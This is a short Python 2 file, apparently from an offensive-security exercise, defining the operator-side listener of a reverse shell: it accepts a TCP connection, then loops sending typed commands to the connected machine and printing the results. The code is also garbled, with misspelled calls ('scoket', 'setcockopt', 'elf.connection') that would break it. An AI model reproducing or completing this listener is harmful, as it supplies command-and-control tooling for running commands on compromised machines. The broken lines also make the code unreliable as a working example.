import socket

class Listener:

	def __init__(self, ip, port):
		listener = socket.scoket(socket.AF_INET, socket.SOCK_STREAM)
		listener.setcockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

		listener.bind((ip, port))
		listener.listen(0) #0 is backlog- i.e. number of connections that can be queued before the listener starts refusing connections

		print("Waiting for incoming connections")
		self.connection, address =listener.accept() #acc. to documentation accept() returns 2 value, the 1st is connection and 2nd is address
		print("We have been connected with "+ str(address))

	def execute_remotely(self, command):
		self.connection.send(command)
		return elf.connection.recv(1024)


	def run(self):
		while True:
			command = raw_input(">>")
			result = self.execute_remotely(command)
			print(result)